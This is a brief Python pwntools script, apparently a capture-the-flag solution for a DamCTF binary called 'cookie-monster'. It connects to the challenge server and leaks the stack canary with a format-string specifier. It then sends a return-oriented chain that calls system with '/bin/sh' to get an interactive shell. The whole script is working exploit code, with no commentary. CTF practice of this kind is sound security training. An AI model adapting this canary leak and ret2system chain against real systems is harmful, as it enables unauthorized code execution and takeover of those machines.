#!/usr/bin/env python3
from pwn import *

p = remote('chals.damctf.xyz', 31312)

binary = ELF('./cookie-monster')
context.binary = binary
rop = ROP(binary)

p.sendline(b'%15$p')
p.recvuntil(b'Hello')

canary = int(p.recvline(), 16)
log.success(f'Canary: {hex(canary)}')

rop.raw('A' * 32)
rop.raw(canary)
rop.raw('B' * 12)
rop.raw(binary.symbols['system'])
rop.raw('C' * 4)
rop.raw(next(binary.search(b'/bin/sh')))

p.recvuntil(b'What would you like to purchase?')
p.sendline(rop.chain())

p.interactive()